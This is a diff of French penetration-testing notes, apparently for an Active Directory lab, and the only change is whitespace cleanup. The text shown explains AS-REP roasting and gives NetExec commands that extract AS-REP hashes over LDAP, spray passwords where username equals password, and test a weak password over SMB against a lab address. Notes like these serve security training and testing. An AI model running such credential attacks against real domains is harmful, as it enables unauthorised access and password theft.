@@ -47,7 +47,7 @@ Si un utilisateur possède l’attribut DONT\_REQ\_PREAUTH dans l’UAC\
 Alors l’envoi du timestamp lors de KRB\_AS\_REQ n’est pas nécessaire\
 N’importe qui peut forger une demande KRB\_AS\_REQ pour un utilisateur arbitraire
 
-#### Extraction&#x20;
+#### Extraction
 
 ```bash
 nxc ldap 192.168.56.11 -u north_users.txt -p '' --asreproast asreproast.txt
@@ -77,7 +77,7 @@ Username = Password
 nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
 ```
 
-Tester des mots de passes simples&#x20;
+Tester des mots de passes simples
 
 ```bash
 nxc smb 192.168.56.11 -u users.txt -p 'Azerty123!'
